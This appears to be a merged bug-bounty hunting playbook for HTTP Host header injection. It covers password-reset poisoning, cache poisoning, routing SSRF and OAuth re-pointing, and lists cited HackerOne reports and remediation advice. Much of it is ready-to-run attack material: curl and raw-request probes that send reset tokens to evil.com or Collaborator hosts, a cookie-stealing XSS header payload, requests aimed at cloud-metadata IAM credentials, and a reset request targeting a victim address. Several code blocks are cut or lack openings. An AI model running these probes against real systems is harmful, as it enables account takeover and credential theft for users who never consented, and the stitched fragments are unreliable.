1. Endpoint + vulnerable header (e.g. POST /forgot-password, X-Forwarded-Host)
2. Exact raw request with injected host (show duplicate/case if used)
3. Observed behaviour: reflected header / Location / cache HIT / email body / OOB hit
4. Proof of shared impact: clean fetch from 2nd IP, Vary absent, Cache HIT, Age>0
5. Impact statement: ATO any user / mass poison / internal reach / session theft
6. Reproduction steps a third party can follow in <10 minutes
7. Remediation: allowlist Host server-side; stop trusting X-Forwarded-*; add Host to cache key;
   build absolute URLs from a fixed configured origin, never from request headers
```

---

## Real Impact Examples

### Scenario A — Password-reset poisoning → ATO (DoD / Concrete CMS pattern)
The attacker intercepts a forgot-password POST for their *own* account and sets
`Host: attacker.example` (or `X-Forwarded-Host` when the proxy overwrites Host). The application
builds the reset URL from that Host and emails it. When the victim requests/clicks the reset, the
token is delivered to the attacker's host (captured in server logs or a Collaborator hit). The
attacker browses to the reset page with the token and changes the victim's password — full ATO.
#1108874 and #226659 are the canonical cases; #737042 and #1092831 show the token leaking via
`Referer`/`Host` on the click instead of the email link itself. Bounty/severity: Critical.

### Scenario B — Unkeyed cache poisoning → mass redirect / DoS (Shopify pattern)
The attacker loops requests with `X-Forwarded-Host: attacker.example` until a shared-cache entry
stores absolute links pointing to the attacker. Subsequent clean requests to the same URL — from
other users — return the poisoned absolute URLs (share buttons, canonical links). #977851 showed
collaborator links surviving in the cached page after the header was removed; #1096609 poisoned
the cache with an arbitrary closed port (`Host: themes.shopify.com:1337`), serving broken/absent
assets to all visitors — a cache-driven DoS paid $2,900. Secondary impact: XSS if the reflected
value contains a payload (#1392935's `img/onerror` reflected into a cached page = stored XSS).

### Scenario C — Host-routed internal reach (urbancompany pattern)
By manipulating Host while keeping the path, the attacker reaches subdomains presumed
internal-only (`av.`, `ims.`, `mesh.urbancompany.com`), classified as SSRF/access-control bypass
and paid $500 (#1783015). #13286 (IRCCloud) demonstrates the same class at the virtual-host layer:
an unrecognized Host is passed to the first defined vhost, so the attacker's Host selects which
application answers the request. #2076786 shows the variant on an `internal.qa.*` host fronted by
istio-envoy.

### Scenario D — Reflected XSS via proxy header (Omise pattern)
`X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>` is read by the server and
reflected unencoded into the response, executing script in the victim's browser and enabling
session theft (#1392935, $200; DoD #882220). With a cache layer, the same reflection becomes
stored XSS for all visitors. #1444675 extends this to open redirect plus content/text spoofing on
an unverified-email dashboard page.

---

## Disclosed Report Citations (30 — all IDs verified present in the study pack)

All IDs below are real HackerOne report IDs present in the 35-report corpus. Subclass / technique /
year / bounty reflect the disclosed text. No ID or URL has been invented.

1. **U.S. Dept Of Defense — Password Reset link hijacking via Host Header Poisoning leads to account takeover** ([H1 #1108874](https://hackerone.com/reports/1108874))
   - Subclass: password-reset poisoning → full account takeover (Weakness: Privilege Escalation)
   - Technique: reset link built from Host; poisoned Host in intercepted reset request → token leak on click
   - Year: 2021 — Critical

2. **Concrete CMS — Password Reset link hijacking via Host Header Poisoning** ([H1 #226659](https://hackerone.com/reports/226659))
   - Subclass: reset poisoning → ATO; canonical skeletoncribe "Practical HTTP Host header attacks" pattern
   - Technique: `Host` changed on `/index.php/login/concrete/forgot_password` → poisoned email link; token read from attacker server logs
   - Year: 2017 — High

3. **U.S. Dept Of Defense — Subdomain Takeover via Host Header Injection on www.█████** ([H1 #2188240](https://hackerone.com/reports/2188240))
   - Subclass: subdomain takeover + Host manipulation (Violation of Secure Design Principles)
   - Technique: unclaimed Netlify CNAME on `www` + Host-header manipulation → takeover
   - Year: 2023 — Critical

4. **urbancompany — Host header injection that bypassed protection and allowed accessing multiple subdomains** ([H1 #1783015](https://hackerone.com/reports/1783015))
   - Subclass: routing-based SSRF / access-control bypass (Weakness: SSRF)
   - Technique: Host manipulation reaches otherwise-internal `av.`, `ims.`, `mesh.` subdomains
   - Year: 2022 — $500 (medium)

5. **Shopify — Host header web cache poisoning lead to DoS** ([H1 #1096609](https://hackerone.com/reports/1096609))
   - Subclass: web cache poisoning → uncontrolled resource consumption / DoS
   - Technique: `Host: themes.shopify.com:1337` (closed port) cached into absolute URLs; grep `:1337` confirms
   - Year: 2021 — $2,900 (CVSS 4.6, Medium)

6. **Shopify — Cache poisoning via X-Forwarded-Host in www.shopify.com/partners/blog** ([H1 #977851](https://hackerone.com/reports/977851))
   - Subclass: unkeyed cache poisoning; collaborator links persisted in cached page
   - Technique: looped `X-Forwarded-Host: your_hackerz_site.com` → poisoned FB share/canonical links
   - Year: 2020 — $1,000 (CVSS 3.6, Low)

7. **Omise — XSS via X-Forwarded-Host header** ([H1 #1392935](https://hackerone.com/reports/1392935))
   - Subclass: reflected XSS (Cross-site Scripting — Reflected)
   - Technique: `X-Forwarded-Host: bing.com"><img src/onerror=prompt(document.cookie)>` reflected into response
   - Year: 2021 — $200 (Medium)

8. **U.S. Dept Of Defense — XSS via X-Forwarded-Host header** ([H1 #882220](https://hackerone.com/reports/882220))
   - Subclass: reflected XSS; server reads request header and reflects in response
   - Technique: crafted `X-Forwarded-Host` reflected unencoded
   - Year: 2020 — Medium

9. **Omise — Host Header Injection leads to Open Redirect and Content Spoofing or Text Injection** ([H1 #1444675](https://hackerone.com/reports/1444675))
   - Subclass: open redirect + content/text spoofing on unverified-email dashboard
   - Technique: `X-Forwarded-Host: bing.com` on `/test/dashboard` → "click here" redirects to malicious page
   - Year: 2022 — $300 (Medium)

10. **Omise — Open redirect Via X-Forwarded-Host** ([H1 #1479889](https://hackerone.com/reports/1479889))
    - Subclass: open redirect via proxy header
    - Technique: `X-Forwarded-Host: example.com` below Host on `link.omise.co`
    - Year: 2022 — Low

11. **Internet Bug Bounty — Host Authorization middleware in Action Pack vulnerable to crafted X-Forwarded-Host values** ([H1 #1374512](https://hackerone.com/reports/1374512))
    - Subclass: authorization / open redirect in Rails HostAuthorization middleware
    - Technique: mixed-case `X-Forwarded-Host: EVIL.COM` bypasses case-sensitive allowlist (CVE-2021-22942 / CVE-2021-22881)
    - Year: 2021 — Medium

12. **Logitech — Host Header injection in oslo.io (using X-Forwarded-For header) leading to email spoofing** ([H1 #1072277](https://hackerone.com/reports/1072277))
    - Subclass: email spoofing / business logic error on invite flow
    - Technique: `Host` change returns 403; `X-Forwarded-Host: example.com` spoofed invite email
    - Year: 2021 — CVSS 7.1 / High

13. **Endless Group — Modify Host Header which is sent to email** ([H1 #791293](https://hackerone.com/reports/791293))
    - Subclass: reset-link poisoning via email source domain (Weakness: Code Injection)
    - Technique: reset mail takes source domain from `Host`; modified link sent to victim's email
    - Year: 2020 — High

14. **Stripo Inc — Password token leak via Host header** ([H1 #737042](https://hackerone.com/reports/737042))
    - Subclass: password token leak → CSRF-style account change
    - Technique: token observed in `Referer`/third-party `Host` on reset-link click
    - Year: 2019 — CVSS 4.6 / Medium

15. **Shopify — Password reset token leak via "Host header" on third party website** ([H1 #1092831](https://hackerone.com/reports/1092831))
    - Subclass: token leakage to third-party host on reset click
    - Technique: reset token leaked in `Host` on `your-store.wholesale.shopifyapps.com`
    - Year: 2021 — —

16. **Rockstar Games — use of unsafe host header leads to open redirect** ([H1 #210875](https://hackerone.com/reports/210875))
    - Subclass: URL shortener abuse / open redirect (Violation of Secure Design Principles)
    - Technique: `$actual_link = "https://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]"` in `getcontent` short-link endpoint
    - Year: 2017 — Low

17. **IRCCloud — Host Header is not validated resulting in Open Redirect** ([H1 #7357](https://hackerone.com/reports/7357))
    - Subclass: open redirect + web-cache poisoning / password-reset email vector
    - Technique: invalid Host not validated → redirect to attacker domain
    - Year: 2014 — $100

18. **Localize — open redirected by host header** ([H1 #2828499](https://hackerone.com/reports/2828499))
    - Subclass: open redirect (Weakness: Open Redirect)
    - Technique: changing Host on `www.localizestaging.com` redirects to changed host
    - Year: 2024 — —

19. **WakaTime — Host Header Injection Redirect** ([H1 #601287](https://hackerone.com/reports/601287))
    - Subclass: open redirect (Weakness: Open Redirect)
    - Technique: `X-Forwarded-Host: bing.com` on `/settings/account?apikeyrefresh=true`
    - Year: 2019 — CVSS 3.7 / Low

20. **Nord Security — Host header injection/redirection (signup and login page)** ([H1 #758380](https://hackerone.com/reports/758380))
    - Subclass: open redirect on signup/login (Weakness: Open Redirect)
    - Technique: `Host: constitutionclub.in` on `affiliates.nordvpn.com/signup` → 301
    - Year: 2019 — Low

21. **Hiro — REDIRECTION VULNERABILITY/HOST HEADER INJECTION VULNERABILITY** ([H1 #300164](https://hackerone.com/reports/300164))
    - Subclass: open redirect in public source (`blockstack-core`)
    - Technique: `Location: https://github.com.evil.net/blockstack/blockstack-core/index.html`
    - Year: 2017 — Medium

22. **Gratipay — Host Header Injection/Redirection Attack** ([H1 #157465](https://hackerone.com/reports/157465))
    - Subclass: open redirect (Weakness: Command Injection — Generic)
    - Technique: Host set outside target domain (`gratipay.com` → `grtp.co`) → redirect
    - Year: 2016 — —

23. **Gratipay — Host Header poisoning on gratipay.com** ([H1 #158482](https://hackerone.com/reports/158482))
    - Subclass: 301 redirect + browser DNS cache poisoning
    - Technique: `Host: heroku.com` → `Location: https://www.heroku.com/`, `Via: 1.1 vegur`
    - Year: 2016 — —

24. **Whisper — Host Header Injection/Redirection** ([H1 #94637](https://hackerone.com/reports/94637))
    - Subclass: open redirect (Weakness: Open Redirect)
    - Technique: `Host: crowdshield.com` → `HTTP/1.1 301` `Location: https://crowdshield.com/`
    - Year: 2015 — $30

25. **Homebrew — Host header Injection** ([H1 #221908](https://hackerone.com/reports/221908))
    - Subclass: open redirect on Netlify-fronted site
    - Technique: `Host: www.google.com` → 301 `Location: https://google.com/`
    - Year: 2017 — Medium

26. **RubyGems — Host header Injection rubygems.org** ([H1 #180196](https://hackerone.com/reports/180196))
    - Subclass: redirect / Varnish-Fastly host confusion (Weakness: Open Redirect)
    - Technique: `Host: www.google.com` → `Fastly error: unknown domain`, then 301 to newrelic.com
    - Year: 2016 — Low

27. **rubygems — Host Header Attac** ([H1 #2627221](https://hackerone.com/reports/2627221))
    - Subclass: open redirect / cache-poison claim
    - Technique: `Forwarded: host=evil.com` → redirect to attacker site
    - Year: 2025 — medium

28. **indrive — Host Header Injection - internal.qa.delivery.indrive.com** ([H1 #2076786](https://hackerone.com/reports/2076786))
    - Subclass: open redirect on internal host fronted by istio-envoy
    - Technique: `Host: bing.com` → `301 location: https://bing.com/`, `server: istio-envoy`
    - Year: 2024 — low

29. **Starbucks — Host header injection/redirection via newsletter signup** ([H1 #229498](https://hackerone.com/reports/229498))
    - Subclass: emailed-link poisoning via `Referer` attribute
    - Technique: `Referer: https://r1otnetsec.herokuapp.com/` rewrote all links in the welcome email
    - Year: 2017 — Low

30. **curl — Cross-origin cookies leak and injection risk when using a custom Host header** ([H1 #3516878](https://hackerone.com/reports/3516878))
    - Subclass: cookie scope leak / injection across cross-origin redirect
    - Technique: custom `Host` + `-L` across `--resolve` hosts leaked `Set-Cookie` to another origin
    - Year: 2026 — —

---

## Related Skills & Chains

- **`hunt-ssrf`** — routing-based Host abuse (`Host: 169.254.169.254` / internal subdomain) is a
  sibling primitive; use its OOB gate for blind cases. Chain: Host-routed reach → internal
  endpoint / metadata → cloud creds (#1783015, #13286).

- **`hunt-xss`** — `X-Forwarded-Host` reflected unencoded into HTML is a reflected-XSS sink; pair
  with a cache key for stored/mass XSS (#1392935, #882220, #977851).

- **`hunt-cache-poisoning`** — unkeyed Host/X-Forwarded-Host reflection is a primary web-cache
  poisoning source; reuse its key-scope and `Vary` checks (#1096609, #977851).

- **`hunt-account-takeover`** — reset poisoning is one of the cleanest ATO bridges; chain token
  capture (Collaborator) → password reset → session takeover (#1108874, #226659, #737042).

- **`hunt-open-redirect`** — Host-driven `Location` is a redirect primitive; chain with OAuth
  `redirect_uri` or phishing for demonstrated impact (#2828499, #601287, #758380).

- **`hunt-subdomain-takeover`** — dangling CNAME + Host trust compounds into Critical
  (#2188240); enumerate and claim before testing poisoned absolute URLs.

- **`hunt-oauth`** — if Host feeds OIDC `issuer` / discovery / `redirect_uri`, re-point the flow
  and capture the code or token on Collaborator (sso-oauth signal in 3 reports).

- **`triage-validation`** — apply the Gate 0 discipline: reflected ≠ cached, confirm from a
  second IP, and verify the actual email body before claiming reset poisoning.

### Chain table
| Host-header primitive | Chain to | Impact |
|---|---|---|
| Reset link host = attacker (own test acct) | Collaborator host → capture token on click | Critical — ATO any user |
| Reflected `X-Forwarded-Host` + unkeyed cache | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | Host steers upstream → internal host / metadata | High/Critical — routing SSRF |
| Dangling CNAME + Host trust | Claim cloud app → poisoned absolute URLs resolve to you | Critical — takeover |
| `X-Forwarded-Host` reflected in HTML | Pair with cache key → stored XSS → session theft | Medium–High |
| Token in `Referer`/Host on click | Capture token → reset victim password | High — ATO via CSRF-style leak |
| Custom Host across cross-origin redirect | Cookie scoped to original host leaks/injects | Medium — session exposure |

### Remediation patterns (what a good fix looks like)
- Build every absolute URL from a single server-side configured origin, never from request headers.
- Enforce a strict `Host` allowlist at the application layer (and reject unknown vhosts at the edge).
- Stop honoring `X-Forwarded-*` / `Forwarded` from untrusted clients; strip them at the reverse proxy.
- Include the Host (and any reflection header) in the cache key, or disable caching of responses
  that contain user-influenced absolute URLs.
- Add `Referrer-Policy` and avoid placing reset tokens in URLs that can leak via `Referer`.


---

## Merged Source Knowledge

This section consolidates **82 unique knowledge blocks** from 2 curated source skills in `hunt-skills/`, `normal-skills/`, and `offensive-skills/`. Blocks overlapping the report-mined sections above were dropped; the complete, globally deduplicated source corpus is archived at `references/source-knowledge.md` (85 unique sections). No source section appears in more than one hunt skill.


### From `hunt-skills/hunt-host-header/SKILL.md`

## Grounding / Provenance

This skill is built from the public Host-header attack literature, not invented payloads.
Cite the *technique source* in your report, never a fabricated ID:

- **Password-reset poisoning class** — the canonical write-up is Skelet's/Detectify-era
  "Practical HTTP Host header attacks" (the Django `request.get_host()` → password-reset-link
  case). Many frameworks built the reset URL from the request Host with no `ALLOWED_HOSTS`-style
  allowlist. Cite the framework + the reflected-Host behaviour you actually observed.
- **Web cache poisoning via unkeyed Host / X-Forwarded-Host** — PortSwigger Research,
  James Kettle, "Practical Web Cache Poisoning" (2018) and "Web Cache Entanglement" (2020).
  These define unkeyed-input poisoning, which is the mechanism behind X-Forwarded-Host poisoning.
- **Routing-based SSRF** — PortSwigger Research, "Cracking the lens" / routing-based SSRF
  (Host header steers the front-end's upstream selection).

When you write the report, name the exact behaviour you reproduced (reflected header, cache HIT
on a fresh key, OOB hit from your Collaborator). Do **not** copy a CVE or H1 ID you have not
verified — a missing citation is always better than a wrong one.

---

## Crown Jewel Targets

Host header injection that reaches password reset links = Critical (ATO for any user).

**Highest-value chains:**
- **Password reset poisoning → ATO** — server builds the reset link from the request Host;
  attacker sets `Host: evil.com`; the victim's reset email points the token at the attacker →
  token captured on click → full ATO. Pre-account-takeover variant: even the victim *requesting*
  their own reset leaks the token to evil.com.
- **Web cache poisoning via unkeyed Host** — a CDN/reverse proxy caches a response that reflects
  an attacker `X-Forwarded-Host` into an absolute URL (script src, link, redirect) → poisoned
  entry served to every later visitor on that cache key → mass XSS/redirect/CSP bypass.
- **Routing-based SSRF** — the front-end uses the *Host header itself* to pick the upstream;
  `Host: 169.254.169.254` (or an internal hostname) makes it forward your request to that target
  → cloud metadata / internal admin panels.
- **Path-override SSRF / ACL bypass** — IIS/ASP.NET/Spring honour `X-Original-URL` /
  `X-Rewrite-URL` to override the routed path → reach `/admin` or internal endpoints the edge
  ACL thought it blocked. (Different layer from routing SSRF — see Phase 3.)
- **OAuth/OIDC poisoning** — Host drives `redirect_uri` or the OIDC `issuer` / discovery doc →
  auth-code or token theft → ATO.

---

## Attack Surface Signals

```
Any password reset / forgot-password / email-verification / invite endpoint
Any app behind CDN/reverse proxy (Cloudflare, Varnish, Fastly, Akamai, Nginx, HAProxy)
OAuth/OIDC authorization + /.well-known/openid-configuration endpoints
Absolute URLs constructed from request Host (set-password links, share links, webhooks)
Email-sending endpoints (transactional mail, notifications)
Reverse proxies that may route by Host (k8s ingress, service mesh, internal forward proxies)
```

**Dangerous header candidates (unkeyed / trusted inputs):**
```
Host                 X-Forwarded-Host      X-Host
X-Forwarded-Server   X-HTTP-Host-Override  Forwarded
X-Original-URL       X-Rewrite-URL         X-Override-URL   (path-override class)
```

---

## Step-by-Step Hunting Methodology

> Always test against **your own** registered test account. Never request another user's reset.

# 1a. Override Host directly
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: evil.com" \
  -H "Content-Type: application/json" \
  -d '{"email":"your-test-account@target.com"}'

# 1b. X-Forwarded-Host (behind reverse proxy that trusts it)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" \
  -H "X-Forwarded-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1c. Host + X-Forwarded-Host combo, and X-Host
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET" -H "X-Host: evil.com" \
  -d "email=your-test-account@target.com"

# 1d. Dual-Host / Host override smuggling: some stacks read the SECOND Host
printf 'POST /forgot-password HTTP/1.1\r\nHost: %s\r\nHost: evil.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 33\r\nConnection: close\r\n\r\nemail=your-test-account@target.com' "$TARGET" \
  | openssl s_client -quiet -connect $TARGET:443 2>/dev/null

#     reset link becomes https://TARGET.evil.com/... or routes the token out
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET.evil.com" -d "email=your-test-account@target.com"

# 1f. Trailing-port / userinfo confusion (parsers that split on : or @)
curl -s -X POST https://$TARGET/forgot-password \
  -H "Host: $TARGET:1@evil.com" -d "email=your-test-account@target.com"
```

**Confirm:** open the reset email *in your own test inbox* and read the link host. The token must
appear under an attacker-controlled host (`evil.com`, `$TARGET.evil.com`, or a Collaborator
domain) for this to be a real finding. **Use a Burp Collaborator domain as the injected host** so
that when the victim clicks (or a preview-fetcher fetches), you capture the token out-of-band and
have proof — see Validation.

### Phase 2 — Web Cache Poisoning via Host / X-Forwarded-Host

Mechanism: this is a **reflection** bug, not an OOB bug. The injected host must be *reflected into
the response body* (an absolute URL, script `src`, `<link href>`, `<base href>`, redirect
`Location`, or canonical/og:url) **and** that response must be **cached on a key you do not
control**. No Collaborator callback is expected from the cache test itself — only later, if a
victim's browser loads the poisoned absolute URL.

```bash

# 2a. Is the host reflected into the body?
curl -s https://$TARGET/ \
  -H "Host: $TARGET" -H "X-Forwarded-Host: canary-$RANDOM.example" \
  | grep -i "canary"

# 2b. Is the response cacheable, and what is the cache key?
curl -sI "https://$TARGET/?cb=$RANDOM" \
  | grep -iE "cache-control|cf-cache-status|x-cache|age|via|surrogate|vary"

# 2c. Prove poisoning: poison once, then fetch CLEAN (no injected header) on same key.
URL="https://$TARGET/?cb=poison$RANDOM"
curl -s "$URL" -H "X-Forwarded-Host: evilcdn.example" >/dev/null   # poison
curl -s "$URL" | grep -i "evilcdn.example"                        # clean victim view → reflected = POISONED
```

**False-positive killers (mandatory):**
- A reflection that only ever appears for *your* request (because the header is **keyed**, e.g. in
  `Vary`, or the CDN includes Host in the key) is **not** poisoning — confirm 2c returns the
  payload on a request that *omits* the header.
- `Age: 0` + `MISS` every time → no shared cache → no mass impact. Demote to self-only / Low.
- Confirm blast radius from a **second machine / fresh egress IP / incognito** before claiming
  "mass". Cache scope is often per-edge / per-cookie / per-geo.

### Phase 3 — SSRF via Host Header — TWO DISTINCT MECHANISMS (do not conflate)

These operate at different layers. Test them separately; they do **not** compose into one request.

**(3A) Routing-based SSRF — the Host header selects the upstream.** The path goes on the
**request line**, exactly as a normal request, because the metadata service / internal host serves
plain HTTP and only sees the request line + headers you forward. `X-Original-URL` is irrelevant
here — the EC2 IMDS ignores it.

```bash

# Correct routing-SSRF probe: path on the request line, Host steers the proxy upstream.
curl -s "https://$TARGET/latest/meta-data/" -H "Host: 169.254.169.254"
curl -s "https://$TARGET/latest/meta-data/iam/security-credentials/" -H "Host: 169.254.169.254"

# GCP / Azure equivalents (still routing via Host):
curl -s "https://$TARGET/computeMetadata/v1/" \
  -H "Host: metadata.google.internal" -H "Metadata-Flavor: Google"
curl -s "https://$TARGET/metadata/instance?api-version=2021-02-01" \
  -H "Host: 169.254.169.254" -H "Metadata: true"

# Internal hostname / port routing:
curl -s "https://$TARGET/" -H "Host: localhost:6379"   # Redis behind the proxy
curl -s "https://$TARGET/" -H "Host: internal-admin.svc.cluster.local"

# proxy's outbound DNS/HTTP lookup — that proves the front-end resolves the attacker host.
curl -s "https://$TARGET/" -H "Host: $COLLAB"
```

**(3B) Path-override SSRF / ACL bypass — `X-Original-URL` / `X-Rewrite-URL`.** This is an
IIS/ASP.NET/Spring-Cloud-Gateway feature where the app overrides the *routed path*. The real Host
stays put; you are bypassing an **edge path ACL**, not steering an upstream. Keep the real Host.

```bash

# Reach an internal/blocked path the edge thought it denied. Real Host stays.
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Original-URL: /admin"
curl -s "https://$TARGET/" -H "Host: $TARGET" -H "X-Rewrite-URL: /internal/metrics"

# Diff against a direct GET /admin (which the edge blocks) — a different status/body proves override.
```

> The old probe `Host: 169.254.169.254` + `X-Original-URL: /latest/meta-data/` was wrong: those
> two headers act at different layers and never compose. Use 3A for metadata, 3B for ACL bypass.

# Does the authorization endpoint build redirect_uri / display URL from Host?
curl -s "https://$TARGET/oauth/authorize?response_type=code&client_id=app&redirect_uri=https://$TARGET/cb" \
  -H "Host: evil.com" | grep -iE "redirect|location|action="

# OIDC discovery: if issuer/endpoints reflect Host, the whole flow can be re-pointed.
curl -s "https://$TARGET/.well-known/openid-configuration" -H "X-Forwarded-Host: evil.com" \
  | grep -iE "issuer|authorization_endpoint|token_endpoint|jwks_uri"
```

**Confirm:** the auth code / token must actually be delivered to the attacker host (capture on
Collaborator) — a reflected string alone is not ATO.

### Phase 5 — Header Fuzzing (Param Miner)

Burp **Param Miner → Guess headers** is faster and finds unkeyed/cache-affecting headers the list
below misses. Manual sweep:

```bash
HOST_HEADERS=(X-Forwarded-Host X-Host X-Forwarded-Server X-HTTP-Host-Override \
  Forwarded X-Original-URL X-Rewrite-URL X-Override-URL X-Forwarded-Scheme)
for H in "${HOST_HEADERS[@]}"; do
  echo "=== $H ==="
  curl -s -I "https://$TARGET/" -H "$H: canary-$RANDOM.example" \
    | grep -iE "location|x-cache|cf-cache|age|set-cookie"
done
```

---

## Chain Table

| Finding | Chain to | Impact |
|---------|----------|--------|
| Reset link host = attacker (own test acct) | Collaborator-host injection → capture token on click | Critical — ATO any user |
| X-Forwarded-Host reflected in absolute URL + cacheable, unkeyed | Poison key → clean fetch returns payload → load XSS/redirect | High — mass cache poisoning |
| Front-end routes by Host | `Host: 169.254.169.254` path-on-request-line → creds | High/Critical — SSRF → cloud creds |
| `X-Original-URL` overrides path | Reach `/admin` blocked at edge | High — ACL bypass / SSRF |
| OAuth redirect_uri/issuer built from Host | Re-point flow → capture code/token on Collaborator | Critical — ATO via code theft |

---

## Validation (house discipline)

✅ **Password reset:** the token URL in **your own test account's email** uses an
attacker-controlled host. Strongest proof = inject a **Collaborator** host and show the inbound
HTTP hit carrying the token when the link is clicked/previewed (OOB capture).
✅ **Cache poison:** a request that **omits** the injected header (fresh egress IP / incognito)
still returns the attacker payload → shared-cache poisoning proven. Demote to Low if Vary-keyed or
`MISS`/`Age:0` only.
✅ **Routing SSRF:** real response body from `169.254.169.254` / internal host, **or** an OOB
DNS/HTTP hit on your Collaborator from the front-end (blind case).
✅ **Path-override:** status/body diff vs the edge-blocked direct request proves the override took.
✅ **OAuth/OIDC:** the auth code / token is actually delivered to the attacker host (captured),
not merely reflected.

**Always rule out false positives:**
- Reflected ≠ cached. Cached-for-you ≠ cached-for-others (check `Vary`, second IP).
- A 200 echoing your Host string is not SSRF unless the *response content* came from the internal
  target or your Collaborator fired.
- Some mailers rewrite links to a fixed `SITE_URL` regardless of Host — reflected header in the
  HTTP response does not guarantee a poisoned *email*; verify the email body.

**Severity:**
- Reset → ATO for any user: Critical
- Routing SSRF → cloud metadata creds: Critical (if creds usable) / High
- Cache poisoning → mass XSS/redirect (shared key proven): High
- Path-override → internal/admin reach: High
- Reflected only, uncacheable, not in email, no internal reach: Low / informational


### From `normal-skills/host-header-injection.md`

name: host-header-injection
description: Comprehensive host header injection testing methodology covering password reset poisoning, web cache poisoning, virtual host misrouting, SSRF via host manipulation, and advanced header variation exploitation with optimized detection and payload techniques.
version: 1.0.0
---

## Overview

Host Header Injection is an attack technique that exploits applications, reverse proxies, load balancers, and caching layers that improperly trust, process, or reflect the `Host` header or its derived alternatives (`X-Forwarded-Host`, `X-HTTP-Host-Override`, `Forwarded`, `:authority`). By manipulating these headers, an attacker can poison password reset emails, poison web caches, route requests to unintended virtual hosts, bypass access controls, and induce Server-Side Request Forgery (SSRF) to internal cloud metadata services.

**HTTP Architecture Context:**
- **HTTP/1.1 Host Header:** Mandatory header defining the target domain (`Host: example.com`)
- **Absolute URI:** `GET http://example.com/path HTTP/1.1` (Host header may be ignored by some proxies)
- **HTTP/2 `:authority`:** Pseudo-header replacing Host in HTTP/2 streams
- **Reverse Proxy Routing:** nginx (`server_name`), Apache (`VirtualHost`), AWS ALB/CloudFront (`Host`-based routing)
- **Cache Key Components:** Often includes Host header + URI + Query String (Varnish, CloudFront, Akamai, Fastly)

**Target Indicators:**
- Password reset functionality sending clickable email links
- Cache layers (CDN, Varnish, Squid, nginx proxy_cache)
- Multi-tenant applications with virtual host routing
- Internal admin panels accessible via hostname restrictions
- Cloud deployments (AWS EC2, GCP Compute Engine, Azure VMs)
- Applications reflecting the Host header in HTML, JavaScript, redirects, or emails

---

### 1.1 Basic Host Header Manipulation

Replace the legitimate `Host` header value with an attacker-controlled domain and observe behavioral changes in responses.

**Baseline Request:**
```http
GET / HTTP/1.1
Host: example.com
```

**Detection Payloads:**

| Test | Modified Header | Indicator of Vulnerability |
|------|----------------|---------------------------|
| Direct replacement | `Host: attacker.com` | Links/redirects point to `attacker.com` |
| Subdomain injection | `Host: attacker.example.com` | DNS resolution attempted, CORS/SSL errors |
| Port injection | `Host: example.com:attacker.com` | Reflected in URLs, parser differential |
| Null byte injection | `Host: example.com%00.attacker.com` | String termination in C-based parsers |
| Case variation | `Host: EXAMPLE.COM` | Case-sensitive routing differences |

**Response Analysis Checklist:**
- [ ] Does the response contain absolute URLs using the injected Host? (`https://attacker.com/reset?token=...`)
- [ ] Are `Location` headers using the injected Host? (`Location: https://attacker.com/login`)
- [ ] Is the Host reflected in HTML (`<base href="https://attacker.com/">`, `<a href="https://attacker.com/...">`)?
- [ ] Is the Host reflected in JavaScript (`var apiHost = "attacker.com";`)?
- [ ] Are email templates (password reset, welcome) using the injected Host in links?
- [ ] Do CSP headers (`Content-Security-Policy`) reference the injected Host?
- [ ] Do CORS headers (`Access-Control-Allow-Origin`) reflect the injected Host?

### 1.2 Header Variation Fuzzing

Test all alternative headers that downstream components may use to determine the target host.

**Complete Header Variation Matrix:**

```http
Host: attacker.com
X-Forwarded-Host: attacker.com
X-HTTP-Host-Override: attacker.com
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Forwarded-Scheme: https
X-Original-URL: http://attacker.com/
X-Rewrite-URL: http://attacker.com/
Forwarded: host=attacker.com
Forwarded: for=192.168.1.1;host=attacker.com;proto=https
Front-End-Https: on
X-Scheme: https
:authority: attacker.com        (HTTP/2 only)
```

**Testing Strategy:**
1. Send each header individually while keeping the original `Host: example.com`
2. Send combinations (Host + X-Forwarded-Host with conflicting values)
3. Observe which header "wins" in routing, reflection, or email generation
4. Document the precedence chain (e.g., `X-Forwarded-Host` overrides `Host` in some nginx configs)

### 1.3 Double Host Header Injection

Some proxies and servers use the first Host header; others use the last. Injecting duplicate headers can reveal parsing differentials.

```http
Host: example.com
Host: attacker.com
```

**Behavioral Analysis:**
- **First-wins parsers** (most RFC-compliant): Use `example.com`
- **Last-wins parsers** (some PHP/Apache configurations): Use `attacker.com`
- **Concatenation:** `example.com, attacker.com` or `example.comattacker.com`

### 1.4 Absolute URI vs Host Header Differential

HTTP/1.1 allows absolute URIs in the request line. Some proxies prioritize the absolute URI over the Host header.

```http
GET http://attacker.com/ HTTP/1.1
Host: example.com
```

**Vulnerability:** If the cache or origin server uses different sources for the host value, this creates a desync or routing issue.

### 1.5 HTTP/2 `:authority` Pseudo-Header Downgrade

HTTP/2 to HTTP/1.1 conversion introduces translation of `:authority` to `Host`. Injecting conflicting values can cause Host header injection in HTTP/2-enabled environments.

```http

# HTTP/2 pseudo-headers
:method: GET
:path: /
:scheme: https
:authority: attacker.com
```

**Downgrade Attack:** If the HTTP/2 frontend translates `:authority` to `Host` but the backend also processes `X-Forwarded-Host`, conflicting routing may occur.

### 1.6 Line Wrapping / HTTP Request Smuggling Context

Injecting Host header values with newline characters can lead to request smuggling, which amplifies Host header injection impact.

```http
Host: example.com
Host: attacker.com
Content-Length: 5

0

GET /admin HTTP/1.1
Host: internal.admin.local
```

*(See Phase 6 for Host Header + Request Smuggling chains)*

---

### 2.1 Attack Mechanics

When a user requests a password reset, the application generates a unique token and sends an email containing a reset link. If the application uses the `Host` header (or its alternatives) to construct the base URL of this link, an attacker can inject a malicious host to receive the reset token.

**Vulnerable Code Pattern (Pseudo):**
```python
reset_url = f"https://{request.headers.get('Host')}/reset-password?token={token}"
send_email(to=user.email, body=f"Click here: {reset_url}")
```

### 2.2 Standard Poisoning Payloads

**Basic Host Replacement:**
```http
POST /forgot-password HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com
```

